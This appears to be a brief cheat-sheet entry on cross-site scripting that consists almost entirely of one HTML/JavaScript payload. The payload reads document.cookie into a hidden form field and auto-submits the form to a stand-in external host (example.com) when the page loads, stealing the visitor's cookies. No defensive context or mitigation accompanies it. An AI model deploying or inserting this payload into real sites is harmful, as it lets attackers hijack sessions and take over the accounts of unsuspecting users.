# XSS (Cross-Site Scripting)

<pre class="language-html"><code class="lang-html">// Capture the cookie data and send it to a server when the page is loaded
&#x3C;form id="form1" action="http://example.com/api/submit" method="POST">
    &#x3C;input id="cookieValue" name="cookie" value=""/>
    &#x3C;input id="number" name="id" value="100"/>   
&#x3C;/form>

&#x3C;script>
    let cookieData = document.cookie;
    document.querySelector("#cookieValue").value = cookieData;
    document.querySelector("#form1").submit()<a data-footnote-ref href="#user-content-fn-1">;</a>
&#x3C;/script>

</code></pre>

[^1]: 
